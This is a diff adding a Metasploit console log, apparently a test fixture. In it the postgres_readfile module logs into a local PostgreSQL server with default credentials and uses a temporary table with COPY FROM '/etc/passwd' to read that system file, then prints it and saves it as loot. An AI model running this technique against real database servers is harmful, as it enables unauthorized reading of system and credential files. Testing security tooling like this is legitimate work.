@@ -1,0 +1,79 @@
+Calling `DidYouMean::SPELL_CHECKERS.merge!(error_name => spell_checker)' has been deprecated. Please call `DidYouMean.correct_error(error_name, spell_checker)' instead.
+Calling `DidYouMean::SPELL_CHECKERS.merge!(error_name => spell_checker)' has been deprecated. Please call `DidYouMean.correct_error(error_name, spell_checker)' instead.
+Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.
+[4mmsf6[0m [0m> loadpath test/modules
+Loaded 43 modules:
+    14 auxiliary modules
+    13 exploit modules
+    16 post modules
+[4mmsf6[0m [0m> features set postgresql_session_type true
+postgresql_session_type => true
+[!] Run the save command and restart the console for this feature to take effect.
+[4mmsf6[0m [0m> use auxiliary/admin/postgres/postgres_readfile
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[4mmsf6[0m auxiliary([1m[31madmin/postgres/postgres_readfile[0m) [0m> run lhost=127.0.0.1 username=postgres password=password rhost=127.0.0.1 rport=5432 Verbose=true
+[*] Running module against 127.0.0.1
+[+] 127.0.0.1:5432 Postgres - Logged in to 'postgres' with 'postgres':'password'
+[*] 127.0.0.1:5432 Postgres - querying with 'select has_database_privilege(current_user,current_database(),'TEMP')'
+[*] 127.0.0.1:5432 Postgres - querying with 'CREATE TEMP TABLE YDLfhsSD (INPUT TEXT);
+      COPY YDLfhsSD FROM '/etc/passwd';
+      SELECT * FROM YDLfhsSD'
+[*] 127.0.0.1:5432 Rows Returned: 21
+Query Text: 'CREATE TEMP TABLE YDLfhsSD (INPUT TEXT);
+      COPY YDLfhsSD FROM '/etc/passwd';
+      SELECT * FROM YDLfhsSD'
+===========================================================================================================================
+
+    input
+    -----
+    Debian-exim:x:101:101::/var/spool/exim4:/bin/false
+    _apt:x:100:65534::/nonexistent:/bin/false
+    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+    bin:x:2:2:bin:/bin:/usr/sbin/nologin
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    games:x:5:60:games:/usr/games:/usr/sbin/nologin
+    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+    postgres:x:999:999::/var/lib/postgresql:/bin/bash
+    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+    root:x:0:0:root:/root:/bin/bash
+    sync:x:4:65534:sync:/bin:/bin/sync
+    sys:x:3:3:sys:/dev:/usr/sbin/nologin
+    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false
+postgres:x:999:999::/var/lib/postgresql:/bin/bash
+Debian-exim:x:101:101::/var/spool/exim4:/bin/false
+[+] 127.0.0.1:5432 Postgres - /etc/passwd saved in /home/runner/.msf4/loot/20240620083956_default_127.0.0.1_postgres.file_416066.txt
+[+] 127.0.0.1:5432 Postgres - Command complete.
+[*] 127.0.0.1:5432 Postgres - Disconnected
+[*] Auxiliary module execution completed
+sessions -K
+[4mmsf6[0m auxiliary([1m[31madmin/postgres/postgres_readfile[0m) [0m> jobs -K
+[*] Killing all sessions...
+[4mmsf6[0m auxiliary([1m[31madmin/postgres/postgres_readfile[0m) [0m> 
